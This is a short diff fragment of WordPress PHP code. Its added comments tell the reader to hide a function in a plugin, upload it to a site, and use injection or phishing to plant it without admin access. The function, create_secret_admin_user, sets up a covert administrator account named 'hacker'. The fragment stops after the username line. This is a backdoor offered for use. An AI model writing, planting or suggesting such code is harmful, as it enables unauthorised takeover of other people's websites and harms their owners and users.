@@ -1,3 +1,5 @@
+// Add the above code to the end of a plugin (or anywhere else in a plugin). And upload it to the WordPress website. 
+//You can use injection methods, Pishing to inject this code if you don't have admin access
 
 function create_secret_admin_user() {
     $username = 'hacker'; // Change this to your secret username
